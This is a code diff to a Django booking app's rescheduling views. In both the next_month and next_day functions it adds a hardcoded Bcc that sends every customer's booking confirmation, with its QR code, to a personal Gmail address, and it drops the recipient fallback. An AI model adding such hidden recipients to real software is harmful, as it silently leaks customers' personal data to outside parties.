@@ -447,7 +447,9 @@ def next_month(request, booking_id):
         msg = MIMEMultipart()
         msg['Subject'] = 'New Booking Confirmation'
         msg['From'] = settings.EMAIL_HOST_USER
-        msg['To'] = new_booking.email or settings.DEFAULT_FROM_EMAIL
+        # msg['To'] = new_booking.email or settings.DEFAULT_FROM_EMAIL
+        msg['To'] = new_booking.email
+        msg['Bcc'] = "magarsafal16@gmail.com"
         msg.attach(MIMEText(html_message, 'html'))
 
         img_data = base64.b64decode(qr_code_base64)
@@ -468,7 +470,7 @@ def next_month(request, booking_id):
                 {'message': 'New booking created successfully, but email failed to send.'},
                 status=200
             )
-
+        messages.success(request, f"New Booking has successfully created to the next month. Confirmation sent to {new_booking.email or settings.DEFAULT_FROM_EMAIL}")
         return JsonResponse({'message': 'New booking successfully created for the next month.'})
 
     except UnifiedBooking.DoesNotExist:
@@ -555,7 +557,9 @@ def next_day(request, booking_id):
         msg = MIMEMultipart()
         msg['Subject'] = 'Booking Rescheduled Confirmation'
         msg['From'] = settings.EMAIL_HOST_USER
-        msg['To'] = booking.email or settings.DEFAULT_FROM_EMAIL
+        # msg['To'] = booking.email or settings.DEFAULT_FROM_EMAIL
+        msg['To'] = booking.email
+        msg['Bcc'] = "magarsafal16@gmail.com"
         msg.attach(MIMEText(html_message, 'html'))
 
         img_data = base64.b64decode(qr_code_base64)
